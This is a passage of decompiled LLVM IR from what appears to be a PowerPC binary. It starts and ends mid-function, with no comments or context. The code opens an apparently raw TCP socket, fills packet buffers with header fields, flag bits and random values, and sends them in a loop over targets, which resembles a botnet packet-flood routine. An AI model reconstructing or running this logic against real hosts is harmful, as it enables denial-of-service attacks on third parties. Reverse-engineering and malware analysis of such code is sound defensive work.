  %v5_100037ac = call i32 @function_100021c0(i32 %v0_100037a8, i32* %v4_100037ac, i32 17, i32 65535)
  %v0_100037b4 = load i32, i32* @r28, align 4
  store i32 %v5_100037ac, i32* %r15.global-to-local, align 4
  %v0_100037c4 = load i32, i32* @r29, align 4
  store i32 %v0_100037c4, i32* %r3.global-to-local, align 4
  store i32 268449740, i32* @lr, align 4
  %v4_100037c8 = inttoptr i32 %v0_100037b4 to i32*
  %v5_100037c8 = call i32 @function_100021c0(i32 %v0_100037c4, i32* %v4_100037c8, i32 18, i32 65535)
  %v0_100037cc = load i32, i32* @r28, align 4
  store i32 %v5_100037c8, i32* %r17.global-to-local, align 4
  %v0_100037dc = load i32, i32* @r29, align 4
  store i32 %v0_100037dc, i32* %r3.global-to-local, align 4
  store i32 268449764, i32* @lr, align 4
  %v4_100037e0 = inttoptr i32 %v0_100037cc to i32*
  %v5_100037e0 = call i32 @function_100021c0(i32 %v0_100037dc, i32* %v4_100037e0, i32 11, i32 0)
  %v0_100037e4 = load i32, i32* @r28, align 4
  %v0_100037f4 = load i32, i32* @r29, align 4
  store i32 %v0_100037f4, i32* %r3.global-to-local, align 4
  store i32 268449788, i32* @lr, align 4
  %v4_100037f8 = inttoptr i32 %v0_100037e4 to i32*
  %v5_100037f8 = call i32 @function_100021c0(i32 %v0_100037f4, i32* %v4_100037f8, i32 12, i32 1)
  %v0_100037fc = load i32, i32* @r28, align 4
  store i32 %v5_100037f8, i32* %r14.global-to-local, align 4
  %v0_1000380c = load i32, i32* @r29, align 4
  store i32 %v0_1000380c, i32* %r3.global-to-local, align 4
  store i32 268449812, i32* @lr, align 4
  %v4_10003810 = inttoptr i32 %v0_100037fc to i32*
  %v5_10003810 = call i32 @function_100021c0(i32 %v0_1000380c, i32* %v4_10003810, i32 13, i32 0)
  %v0_10003814 = load i32, i32* @r28, align 4
  store i32 %v5_10003810, i32* %r24.global-to-local, align 4
  %v0_10003824 = load i32, i32* @r29, align 4
  store i32 %v0_10003824, i32* %r3.global-to-local, align 4
  store i32 268449836, i32* @lr, align 4
  %v4_10003828 = inttoptr i32 %v0_10003814 to i32*
  %v5_10003828 = call i32 @function_100021c0(i32 %v0_10003824, i32* %v4_10003828, i32 14, i32 0)
  %v0_1000382c = load i32, i32* @r28, align 4
  store i32 %v5_10003828, i32* %r27.global-to-local, align 4
  %v0_1000383c = load i32, i32* @r29, align 4
  store i32 %v0_1000383c, i32* %r3.global-to-local, align 4
  store i32 268449860, i32* @lr, align 4
  %v4_10003840 = inttoptr i32 %v0_1000382c to i32*
  %v5_10003840 = call i32 @function_100021c0(i32 %v0_1000383c, i32* %v4_10003840, i32 15, i32 0)
  %v0_10003844 = load i32, i32* @r28, align 4
  store i32 %v5_10003840, i32* %r26.global-to-local, align 4
  %v0_10003854 = load i32, i32* @r29, align 4
  store i32 %v0_10003854, i32* %r3.global-to-local, align 4
  store i32 268449884, i32* @lr, align 4
  %v4_10003858 = inttoptr i32 %v0_10003844 to i32*
  %v5_10003858 = call i32 @function_100021c0(i32 %v0_10003854, i32* %v4_10003858, i32 16, i32 0)
  %v0_1000385c = load i32, i32* @r28, align 4
  store i32 %v5_10003858, i32* %r30.global-to-local, align 4
  %v0_1000386c = load i32, i32* @r29, align 4
  store i32 %v0_1000386c, i32* %r3.global-to-local, align 4
  store i32 268449908, i32* @lr, align 4
  %v4_10003870 = inttoptr i32 %v0_1000385c to i32*
  %v5_10003870 = call i32 @function_100021c0(i32 %v0_1000386c, i32* %v4_10003870, i32 0, i32 512)
  %v0_10003874 = load i32, i32* @r28, align 4
  store i32 %v5_10003870, i32* %r16.global-to-local, align 4
  %v0_10003884 = load i32, i32* @r29, align 4
  store i32 %v0_10003884, i32* %r3.global-to-local, align 4
  store i32 268449932, i32* @lr, align 4
  %v4_10003888 = inttoptr i32 %v0_10003874 to i32*
  %v5_10003888 = call i32 @function_100021c0(i32 %v0_10003884, i32* %v4_10003888, i32 1, i32 1)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10003890 = load i32, i32* @global_var_1001b288.63, align 4
  %v1_10003894 = urem i32 %v5_10003888, 256
  %v0_10003898 = load i32, i32* @r28, align 4
  %v0_100038a4 = load i32, i32* @r29, align 4
  store i32 %v0_100038a4, i32* %r3.global-to-local, align 4
  store i32 268449964, i32* @lr, align 4
  %v5_100038a8 = inttoptr i32 %v0_10003898 to i32*
  %v6_100038a8 = call i32 @function_10002140(i32 %v0_100038a4, i32* %v5_100038a8, i32 25, i32 %v3_10003890, i32 268566528)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268449984, i32* @lr, align 4
  %v3_100038bc = call i32 @function_10008b34(i32 2, i32 3, i32 6)
  store i32 %v3_100038bc, i32* %r3.global-to-local, align 4
  %v3_100038c0 = icmp eq i32 %v3_100038bc, -1
  store i32 %v3_100038bc, i32* %r23.global-to-local, align 4
  br i1 %v3_100038c0, label %dec_label_pc_10003c00, label %dec_label_pc_100038cc

dec_label_pc_100038cc:                            ; preds = %dec_label_pc_1000367c
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100038d8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-136, align 4
  store i32 268450024, i32* @lr, align 4
  %v5_100038e4 = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_100038d8, i32 4, i32 4)
  store i32 %v5_100038e4, i32* %r3.global-to-local, align 4
  %v3_100038e8 = icmp eq i32 %v5_100038e4, -1
  br i1 %v3_100038e8, label %dec_label_pc_10003bf8, label %dec_label_pc_100038f0

dec_label_pc_100038f0:                            ; preds = %dec_label_pc_100038cc
  %v0_100038f0 = load i32, i32* %r21.global-to-local, align 4
  %v1_100038f0 = icmp slt i32 %v0_100038f0, 0
  %v3_100038f0 = icmp eq i32 %v0_100038f0, 0
  store i1 %v1_100038f0, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100038f0, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  %v0_100038fc = load i32, i32* %r18.global-to-local, align 4
  %v1_100038fc = urem i32 %v0_100038fc, 65536
  store i32 %v1_100038fc, i32* %r18.global-to-local, align 4
  %v0_10003900 = load i32, i32* %r19.global-to-local, align 4
  %v1_10003900 = urem i32 %v0_10003900, 65536
  store i32 %v1_10003900, i32* %r19.global-to-local, align 4
  %v0_10003904 = load i32, i32* %r20.global-to-local, align 4
  %v1_10003904 = urem i32 %v0_10003904, 65536
  store i32 %v1_10003904, i32* %r20.global-to-local, align 4
  %tmp40 = icmp slt i32 %v0_100038f0, 1
  br i1 %tmp40, label %dec_label_pc_10003bd8, label %dec_label_pc_1000390c

dec_label_pc_1000390c:                            ; preds = %dec_label_pc_100038f0
  %v0_10003910 = load i32, i32* %r24.global-to-local, align 4
  %v1_10003910 = urem i32 %v0_10003910, 256
  %v0_10003914 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003914 = add i32 %v0_10003914, 40
  store i32 %v1_10003914, i32* %r24.global-to-local, align 4
  %v3_10003918 = icmp eq i32 %v1_10003910, 0
  store i1 %v3_10003918, i1* %cr3_eq.global-to-local, align 1
  %v1_1000391c = urem i32 %v5_100037e0, 2
  store i32 %v1_1000391c, i32* %r9.global-to-local, align 4
  %v0_10003920 = load i32, i32* %r26.global-to-local, align 4
  %v1_10003920 = urem i32 %v0_10003920, 2
  store i32 %v1_10003920, i32* %r28.global-to-local, align 4
  %v1_10003924 = urem i32 %v0_10003910, 2
  store i32 %v1_10003924, i32* %r26.global-to-local, align 4
  %v1_10003928 = urem i32 %v1_10003914, 65536
  store i32 %v1_10003928, i32* %r0.global-to-local, align 4
  %v0_10003930 = load i32, i32* @r31, align 4
  %v3_10003930 = icmp eq i32 %v0_10003930, 0
  store i1 %v3_10003930, i1* %cr2_eq.global-to-local, align 1
  %v5_10003934 = trunc i32 %v1_10003914 to i16
  %v0_10003938 = load i32, i32* %r14.global-to-local, align 4
  %v1_10003938 = urem i32 %v0_10003938, 2
  store i32 %v1_10003938, i32* %r14.global-to-local, align 4
  %v0_1000393c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000393c = urem i32 %v0_1000393c, 2
  store i32 %v1_1000393c, i32* %r27.global-to-local, align 4
  %v0_10003940 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003940 = urem i32 %v0_10003940, 2
  %v4_10003990 = sext i8 %v5_10003714 to i32
  br label %dec_label_pc_10003948

dec_label_pc_10003948:                            ; preds = %dec_label_pc_10003a28, %dec_label_pc_1000390c
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268450132, i32* @lr, align 4
  %v2_10003950 = call i32 @function_10008ec0(i32 1510, i32 1)
  store i32 %v2_10003950, i32* %r3.global-to-local, align 4
  %v3_10003954 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003954, i32* %r9.global-to-local, align 4
  %v0_10003958 = load i32, i32* @r31, align 4
  %v1_10003958 = mul i32 %v0_10003958, 4
  store i32 %v1_10003958, i32* %r0.global-to-local, align 4
  %v1_1000395c = load i32, i32* %r22.global-to-local, align 4
  %v3_1000395c = add i32 %v1_1000395c, %v1_10003958
  %v4_1000395c = inttoptr i32 %v3_1000395c to i32*
  store i32 %v2_10003950, i32* %v4_1000395c, align 4
  %v0_10003960 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003960 = mul i32 %v0_10003960, 4
  store i32 %v1_10003960, i32* %r9.global-to-local, align 4
  %v1_10003964 = load i32, i32* %r22.global-to-local, align 4
  %v2_10003964 = add i32 %v1_10003964, %v1_10003960
  %v3_10003964 = inttoptr i32 %v2_10003964 to i32*
  %v4_10003964 = load i32, i32* %v3_10003964, align 4
  store i32 %v4_10003964, i32* @r31, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_1000396c = inttoptr i32 %v4_10003964 to i32*
  %v2_1000396c = load i32, i32* %v1_1000396c, align 4
  store i32 %v2_1000396c, i32* %r0.global-to-local, align 4
  %v1_10003970 = add i32 %v4_10003964, 20
  store i32 %v1_10003970, i32* @r30, align 4
  %v0_10003974 = load i32, i32* %r18.global-to-local, align 4
  %v1_10003974 = trunc i32 %v0_10003974 to i16
  %v3_10003974 = add i32 %v4_10003964, 4
  %v4_10003974 = inttoptr i32 %v3_10003974 to i16*
  store i16 %v1_10003974, i16* %v4_10003974, align 2
  %v1_10003978 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003978, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10003980 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10003984 = load i32, i32* @r31, align 4
  %v2_10003984 = inttoptr i32 %v1_10003984 to i32*
  store i32 %v1_10003980, i32* %v2_10003984, align 4
  %v2_1000398c = load i32, i32* @r31, align 4
  %v3_1000398c = add i32 %v2_1000398c, 8
  %v4_1000398c = inttoptr i32 %v3_1000398c to i8*
  store i8 %v5_1000374c, i8* %v4_1000398c, align 1
  store i32 %v4_10003990, i32* %r9.global-to-local, align 4
  %v2_10003994 = load i32, i32* @r31, align 4
  %v3_10003994 = add i32 %v2_10003994, 1
  %v4_10003994 = inttoptr i32 %v3_10003994 to i8*
  store i8 %v5_10003714, i8* %v4_10003994, align 1
  store i32 %v1_10003914, i32* %r0.global-to-local, align 4
  %v2_1000399c = load i32, i32* @r31, align 4
  %v3_1000399c = add i32 %v2_1000399c, 2
  %v4_1000399c = inttoptr i32 %v3_1000399c to i16*
  store i16 %v5_10003934, i16* %v4_1000399c, align 2
  %v0_100039a0 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100039a0, label %dec_label_pc_100039ac, label %dec_label_pc_100039a4

dec_label_pc_100039a4:                            ; preds = %dec_label_pc_10003948
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100039a8 = load i32, i32* @r31, align 4
  %v3_100039a8 = add i32 %v2_100039a8, 6
  %v4_100039a8 = inttoptr i32 %v3_100039a8 to i16*
  store i16 16384, i16* %v4_100039a8, align 2
  br label %dec_label_pc_100039ac

dec_label_pc_100039ac:                            ; preds = %dec_label_pc_10003948, %dec_label_pc_100039a4
  store i32 6, i32* %r0.global-to-local, align 4
  %v0_100039b0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100039b0 = trunc i32 %v0_100039b0 to i16
  %v2_100039b0 = load i32, i32* @r31, align 4
  %v3_100039b0 = add i32 %v2_100039b0, 20
  %v4_100039b0 = inttoptr i32 %v3_100039b0 to i16*
  store i16 %v1_100039b0, i16* %v4_100039b0, align 2
  %v0_100039b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100039b4 = trunc i32 %v0_100039b4 to i8
  %v2_100039b4 = load i32, i32* @r31, align 4
  %v3_100039b4 = add i32 %v2_100039b4, 9
  %v4_100039b4 = inttoptr i32 %v3_100039b4 to i8*
  store i8 %v1_100039b4, i8* %v4_100039b4, align 1
  %v0_100039b8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100039b8 = trunc i32 %v0_100039b8 to i16
  %v2_100039b8 = load i32, i32* @r30, align 4
  %v3_100039b8 = add i32 %v2_100039b8, 2
  %v4_100039b8 = inttoptr i32 %v3_100039b8 to i16*
  store i16 %v1_100039b8, i16* %v4_100039b8, align 2
  %v1_100039c0 = load i32, i32* @r31, align 4
  %v2_100039c0 = add i32 %v1_100039c0, 12
  %v3_100039c0 = inttoptr i32 %v2_100039c0 to i32*
  store i32 %v6_100038a8, i32* %v3_100039c0, align 4
  %v3_100039c4 = load i32, i32* %stack_var_-136, align 4
  %v1_100039c8 = mul i32 %v3_100039c4, 24
  %v1_100039cc = load i32, i32* %r25.global-to-local, align 4
  %v2_100039cc = add i32 %v1_100039cc, %v1_100039c8
  store i32 %v2_100039cc, i32* %r9.global-to-local, align 4
  %v1_100039d0 = add i32 %v2_100039cc, 16
  %v2_100039d0 = inttoptr i32 %v1_100039d0 to i32*
  %v3_100039d0 = load i32, i32* %v2_100039d0, align 4
  store i32 %v3_100039d0, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_100039d8 = load i32, i32* @r31, align 4
  %v2_100039d8 = add i32 %v1_100039d8, 16
  %v3_100039d8 = inttoptr i32 %v2_100039d8 to i32*
  store i32 %v3_100039d0, i32* %v3_100039d8, align 4
  %v0_100039dc = load i32, i32* %r15.global-to-local, align 4
  %v1_100039dc = load i32, i32* @r30, align 4
  %v2_100039dc = add i32 %v1_100039dc, 4
  %v3_100039dc = inttoptr i32 %v2_100039dc to i32*
  store i32 %v0_100039dc, i32* %v3_100039dc, align 4
  %v0_100039e0 = load i32, i32* @r30, align 4
  %v1_100039e0 = add i32 %v0_100039e0, 12
  %v2_100039e0 = inttoptr i32 %v1_100039e0 to i32*
  %v3_100039e0 = load i32, i32* %v2_100039e0, align 4
  store i32 %v3_100039e0, i32* %r0.global-to-local, align 4
  %v1_100039e4 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_100039e4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000391c, i32* %r9.global-to-local, align 4
  %v1_100039ec = call i32 @__asm_rlwimi(i32 %v1_1000391c, i32 21, i32 10, i32 10)
  store i32 %v1_100039ec, i32* %r0.global-to-local, align 4
  %v1_100039f0 = call i32 @__asm_rlwimi(i32 %v1_10003938, i32 20, i32 11, i32 11)
  store i32 %v1_100039f0, i32* %r0.global-to-local, align 4
  %v1_100039f4 = call i32 @__asm_rlwimi(i32 %v1_10003924, i32 19, i32 12, i32 12)
  store i32 %v1_100039f4, i32* %r0.global-to-local, align 4
  %v1_100039f8 = call i32 @__asm_rlwimi(i32 %v1_1000393c, i32 18, i32 13, i32 13)
  store i32 %v1_100039f8, i32* %r0.global-to-local, align 4
  %v1_100039fc = call i32 @__asm_rlwimi(i32 %v1_10003920, i32 17, i32 14, i32 14)
  store i32 %v1_100039fc, i32* %r0.global-to-local, align 4
  %v1_10003a00 = call i32 @__asm_rlwimi(i32 %v1_10003940, i32 16, i32 15, i32 15)
  store i32 %v1_10003a00, i32* %r0.global-to-local, align 4
  %v1_10003a04 = load i32, i32* @r30, align 4
  %v2_10003a04 = add i32 %v1_10003a04, 12
  %v3_10003a04 = inttoptr i32 %v2_10003a04 to i32*
  store i32 %v1_10003a00, i32* %v3_10003a04, align 4
  %v0_10003a08 = call i32 @function_10006318()
  %v1_10003a08 = trunc i32 %v0_10003a08 to i16
  %v0_10003a0c = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10003a0c, i32* @r4, align 4
  %v3_10003a10 = load i32, i32* @r30, align 4
  %v4_10003a10 = add i32 %v3_10003a10, 14
  %v5_10003a10 = inttoptr i32 %v4_10003a10 to i16*
  store i16 %v1_10003a08, i16* %v5_10003a10, align 2
  %v0_10003a14 = load i32, i32* @r31, align 4
  %v1_10003a14 = add i32 %v0_10003a14, 40
  store i32 %v1_10003a14, i32* @r3, align 4
  %v0_10003a18 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003a18, label %dec_label_pc_10003a28, label %dec_label_pc_10003a1c

dec_label_pc_10003a1c:                            ; preds = %dec_label_pc_100039ac
  %v0_10003a1c = load i32, i32* @r30, align 4
  %v1_10003a1c = add i32 %v0_10003a1c, 12
  %v2_10003a1c = inttoptr i32 %v1_10003a1c to i32*
  %v3_10003a1c = load i32, i32* %v2_10003a1c, align 4
  %v1_10003a20 = or i32 %v3_10003a1c, 524288
  store i32 %v1_10003a20, i32* %r0.global-to-local, align 4
  store i32 %v1_10003a20, i32* %v2_10003a1c, align 4
  br label %dec_label_pc_10003a28

dec_label_pc_10003a28:                            ; preds = %dec_label_pc_100039ac, %dec_label_pc_10003a1c
  %v0_10003a28 = call i32 @function_10006544()
  store i32 %v0_10003a28, i32* %r3.global-to-local, align 4
  %v3_10003a2c = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003a2c, i32* %r9.global-to-local, align 4
  %v1_10003a30 = add i32 %v3_10003a2c, 1
  %v1_10003a34 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003a34 = icmp slt i32 %v1_10003a30, %v1_10003a34
  store i32 %v1_10003a30, i32* %stack_var_-136, align 4
  br i1 %v2_10003a34, label %dec_label_pc_10003948, label %dec_label_pc_10003a40

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a28
  store i32 %v6_100038a8, i32* %r0.global-to-local, align 4
  %v0_10003a44 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003a44 = add i32 %v0_10003a44, 20
  store i32 %v1_10003a44, i32* @r30, align 4
  store i32 %v1_10003894, i32* %r9.global-to-local, align 4
  %v3_10003a4c = icmp eq i32 %v6_100038a8, -1
  store i1 %v3_10003a4c, i1* %cr2_eq.global-to-local, align 1
  %v3_10003a50 = icmp eq i32 %v1_10003894, 0
  store i1 %v3_10003a50, i1* %cr3_eq.global-to-local, align 1
  %v0_10003a54.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10003a54.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10003a54.preheader

dec_label_pc_10003a54.preheader:                  ; preds = %dec_label_pc_10003b34, %dec_label_pc_10003bd8, %dec_label_pc_10003a40
  %v1_10003a54 = phi i1 [ %v1_100038f0, %dec_label_pc_10003bd8 ], [ %v1_10003a54.pre, %dec_label_pc_10003a40 ], [ %v1_10003b34, %dec_label_pc_10003b34 ]
  %v0_10003a54 = phi i1 [ %v3_100038f0, %dec_label_pc_10003bd8 ], [ %v0_10003a54.pre, %dec_label_pc_10003a40 ], [ %v0_10003b34, %dec_label_pc_10003b34 ]
  %v2_10003a54 = or i1 %v1_10003a54, %v0_10003a54
  br label %dec_label_pc_10003a54

dec_label_pc_10003a54:                            ; preds = %dec_label_pc_10003a54.preheader, %dec_label_pc_10003a54
  br i1 %v2_10003a54, label %dec_label_pc_10003a54, label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a54, %dec_label_pc_10003b34
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10003a5c = load i32, i32* @r30, align 4
  %v1_10003a5c = urem i32 %v0_10003a5c, 65536
  store i32 %v1_10003a5c, i32* %r27.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003a6c

dec_label_pc_10003a6c:                            ; preds = %dec_label_pc_10003ac4, %dec_label_pc_10003a58
  %v0_10003a6c = phi i32 [ %v1_10003b24, %dec_label_pc_10003ac4 ], [ 0, %dec_label_pc_10003a58 ]
  %v1_10003a6c = mul i32 %v0_10003a6c, 24
  store i32 %v1_10003a6c, i32* %r0.global-to-local, align 4
  %v1_10003a70 = mul i32 %v0_10003a6c, 4
  %v1_10003a74 = load i32, i32* %r22.global-to-local, align 4
  %v2_10003a74 = add i32 %v1_10003a74, %v1_10003a70
  %v3_10003a74 = inttoptr i32 %v2_10003a74 to i32*
  %v4_10003a74 = load i32, i32* %v3_10003a74, align 4
  store i32 %v4_10003a74, i32* %r28.global-to-local, align 4
  %v1_10003a78 = load i32, i32* %r25.global-to-local, align 4
  %v2_10003a78 = add i32 %v1_10003a78, %v1_10003a6c
  %v1_10003a7c = add i32 %v2_10003a78, 20
  %v2_10003a7c = inttoptr i32 %v1_10003a7c to i8*
  %v3_10003a7c = load i8, i8* %v2_10003a7c, align 1
  %v4_10003a7c = zext i8 %v3_10003a7c to i32
  store i32 %v4_10003a7c, i32* %r9.global-to-local, align 4
  %v1_10003a80 = add i32 %v4_10003a74, 20
  store i32 %v1_10003a80, i32* @r31, align 4
  %tmp41 = icmp ult i8 %v3_10003a7c, 32
  br i1 %tmp41, label %dec_label_pc_10003b3c, label %dec_label_pc_10003a8c

dec_label_pc_10003a8c:                            ; preds = %dec_label_pc_10003a6c
  %v0_10003a8c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003a8c, label %dec_label_pc_10003b64, label %dec_label_pc_10003a90

dec_label_pc_10003a90:                            ; preds = %dec_label_pc_10003b3c, %dec_label_pc_10003a8c
  store i32 65535, i32* @r29, align 4
  %v0_10003a98 = load i32, i32* %r18.global-to-local, align 4
  %v4_10003a98 = icmp eq i32 %v0_10003a98, 65535
  br i1 %v4_10003a98, label %dec_label_pc_10003b7c, label %dec_label_pc_10003aa0

dec_label_pc_10003aa0:                            ; preds = %dec_label_pc_10003b64, %dec_label_pc_10003a90
  %v1_10003aa0 = phi i32 [ %v1_10003b74, %dec_label_pc_10003b64 ], [ 65535, %dec_label_pc_10003a90 ]
  %v0_10003aa0 = load i32, i32* %r19.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v1_10003aa0
  br i1 %v4_10003aa0, label %dec_label_pc_10003b8c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003b7c.dec_label_pc_10003aa8_crit_edge, %dec_label_pc_10003aa0
  %v1_10003aa8 = phi i32 [ %v1_10003aa8.pre, %dec_label_pc_10003b7c.dec_label_pc_10003aa8_crit_edge ], [ %v1_10003aa0, %dec_label_pc_10003aa0 ]
  %v0_10003aa8 = load i32, i32* %r20.global-to-local, align 4
  %v4_10003aa8 = icmp eq i32 %v0_10003aa8, %v1_10003aa8
  br i1 %v4_10003aa8, label %dec_label_pc_10003b9c, label %dec_label_pc_10003ab0

dec_label_pc_10003ab0:                            ; preds = %dec_label_pc_10003b8c.dec_label_pc_10003ab0_crit_edge, %dec_label_pc_10003aa8
  %v1_10003ab0 = phi i32 [ %v1_10003ab0.pre, %dec_label_pc_10003b8c.dec_label_pc_10003ab0_crit_edge ], [ %v1_10003aa8, %dec_label_pc_10003aa8 ]
  %v0_10003ab0 = load i32, i32* %r15.global-to-local, align 4
  %v4_10003ab0 = icmp eq i32 %v0_10003ab0, %v1_10003ab0
  br i1 %v4_10003ab0, label %dec_label_pc_10003bac, label %dec_label_pc_10003ab8

dec_label_pc_10003ab8:                            ; preds = %dec_label_pc_10003b9c.dec_label_pc_10003ab8_crit_edge, %dec_label_pc_10003ab0
  %v1_10003ab8 = phi i32 [ %v1_10003ab8.pre, %dec_label_pc_10003b9c.dec_label_pc_10003ab8_crit_edge ], [ %v1_10003ab0, %dec_label_pc_10003ab0 ]
  %v0_10003ab8 = load i32, i32* %r17.global-to-local, align 4
  %v4_10003ab8 = icmp eq i32 %v0_10003ab8, %v1_10003ab8
  br i1 %v4_10003ab8, label %dec_label_pc_10003bbc, label %dec_label_pc_10003ac0

dec_label_pc_10003ac0:                            ; preds = %dec_label_pc_10003bac, %dec_label_pc_10003ab8
  %v0_10003ac0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003ac0, label %dec_label_pc_10003ac4, label %dec_label_pc_10003bc8

dec_label_pc_10003ac4:                            ; preds = %dec_label_pc_10003ac0, %dec_label_pc_10003bbc, %dec_label_pc_10003bc8
  %v0_10003ac4 = load i32, i32* %r26.global-to-local, align 4
  %v1_10003ac4 = trunc i32 %v0_10003ac4 to i16
  %v2_10003ac4 = load i32, i32* %r28.global-to-local, align 4
  %v3_10003ac4 = add i32 %v2_10003ac4, 10
  %v4_10003ac4 = inttoptr i32 %v3_10003ac4 to i16*
  store i16 %v1_10003ac4, i16* %v4_10003ac4, align 2
  %v0_10003acc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003acc, i32* @r3, align 4
  %v2_10003ad0 = call i32 @function_1000491c(i32 %v0_10003acc, i32 20)
  %v3_10003ad0 = trunc i32 %v2_10003ad0 to i16
  %v0_10003ad4 = load i32, i32* @r31, align 4
  store i32 %v0_10003ad4, i32* @r4, align 4
  %v4_10003ad8 = add i32 %v0_10003acc, 10
  %v5_10003ad8 = inttoptr i32 %v4_10003ad8 to i16*
  store i16 %v3_10003ad0, i16* %v5_10003ad8, align 2
  %v0_10003adc = load i32, i32* %r27.global-to-local, align 4
  %v0_10003ae0 = load i32, i32* %r26.global-to-local, align 4
  %v1_10003ae0 = trunc i32 %v0_10003ae0 to i16
  %v2_10003ae0 = load i32, i32* @r31, align 4
  %v3_10003ae0 = add i32 %v2_10003ae0, 16
  %v4_10003ae0 = inttoptr i32 %v3_10003ae0 to i16*
  store i16 %v1_10003ae0, i16* %v4_10003ae0, align 2
  %v0_10003ae4 = load i32, i32* @r30, align 4
  %v0_10003ae8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003ae8, i32* %r3.global-to-local, align 4
  %v4_10003aec = call i32 @function_10004980(i32 %v0_10003ae8, i32 %v0_10003ad4, i32 %v0_10003adc, i32 %v0_10003ae4)
  %v5_10003aec = trunc i32 %v4_10003aec to i16
  store i32 %v4_10003aec, i32* %r3.global-to-local, align 4
  %v3_10003af0 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003af0, i32* %r7.global-to-local, align 4
  %v0_10003af4 = load i32, i32* @r31, align 4
  %v1_10003af4 = add i32 %v0_10003af4, 2
  %v2_10003af4 = inttoptr i32 %v1_10003af4 to i16*
  %v3_10003af4 = load i16, i16* %v2_10003af4, align 2
  %v4_10003af4 = zext i16 %v3_10003af4 to i32
  store i32 %v4_10003af4, i32* %r0.global-to-local, align 4
  %v0_10003af8 = load i32, i32* %r28.global-to-local, align 4
  %v1_10003afc = mul i32 %v3_10003af0, 24
  store i32 %v1_10003afc, i32* %r7.global-to-local, align 4
  %v4_10003b00 = add i32 %v0_10003af4, 16
  %v5_10003b00 = inttoptr i32 %v4_10003b00 to i16*
  store i16 %v5_10003aec, i16* %v5_10003b00, align 2
  %v0_10003b04 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003b08 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10003b08, i32* %r3.global-to-local, align 4
  %v0_10003b0c = load i32, i32* %r7.global-to-local, align 4
  %v1_10003b0c = load i32, i32* %r25.global-to-local, align 4
  %v2_10003b0c = add i32 %v1_10003b0c, %v0_10003b0c
  store i32 %v2_10003b0c, i32* %r7.global-to-local, align 4
  %v0_10003b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003b14 = trunc i32 %v0_10003b14 to i16
  %v3_10003b14 = add i32 %v2_10003b0c, 2
  %v4_10003b14 = inttoptr i32 %v3_10003b14 to i16*
  store i16 %v1_10003b14, i16* %v4_10003b14, align 2
  store i32 268450592, i32* @lr, align 4
  %v6_10003b1c = call i32 @function_10008ab8(i32 %v0_10003b08, i32 %v0_10003af8, i32 %v0_10003b04, i32 16384, i32 %v2_10003b0c, i32 16)
  store i32 %v6_10003b1c, i32* %r3.global-to-local, align 4
  %v3_10003b20 = load i32, i32* %stack_var_-136, align 4
  %v1_10003b24 = add i32 %v3_10003b20, 1
  store i32 %v1_10003b24, i32* %r9.global-to-local, align 4
  %v1_10003b28 = load i32, i32* %r21.global-to-local, align 4
  %v2_10003b28 = icmp slt i32 %v1_10003b24, %v1_10003b28
  store i32 %v1_10003b24, i32* %stack_var_-136, align 4
  br i1 %v2_10003b28, label %dec_label_pc_10003a6c, label %dec_label_pc_10003b34

dec_label_pc_10003b34:                            ; preds = %dec_label_pc_10003ac4
  %v0_10003b34 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10003b34 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10003b34 = or i1 %v0_10003b34, %v1_10003b34
  br i1 %v2_10003b34, label %dec_label_pc_10003a54.preheader, label %dec_label_pc_10003a58

dec_label_pc_10003b3c:                            ; preds = %dec_label_pc_10003a6c
